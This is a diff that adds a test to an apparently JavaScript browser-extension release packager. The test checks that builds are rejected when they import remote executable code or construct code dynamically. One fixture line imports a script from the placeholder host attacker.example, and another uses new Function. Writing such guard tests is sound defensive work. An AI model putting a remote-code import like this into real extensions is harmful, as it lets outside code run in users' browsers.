@@ -105,4 +105,30 @@ describe("extension release packaging", () => {
       }),
     ).rejects.toThrow("cannot contain host permissions");
   });
+
+  it("rejects remote executable JavaScript and dynamic code construction", async () => {
+    const { dist, firstOutput } = await fixture();
+    await writeFile(
+      join(dist, "background.js"),
+      'const module = import("https://attacker.example/remote.js");\n',
+    );
+    await expect(
+      createReleaseArchive({
+        distDirectory: dist,
+        outputDirectory: firstOutput,
+        packageVersion: "0.2.0",
+        policy,
+      }),
+    ).rejects.toThrow("Remote executable JavaScript");
+
+    await writeFile(join(dist, "background.js"), 'const execute = new Function("return 1");\n');
+    await expect(
+      createReleaseArchive({
+        distDirectory: dist,
+        outputDirectory: firstOutput,
+        packageVersion: "0.2.0",
+        policy,
+      }),
+    ).rejects.toThrow("Dynamic code construction");
+  });
 });
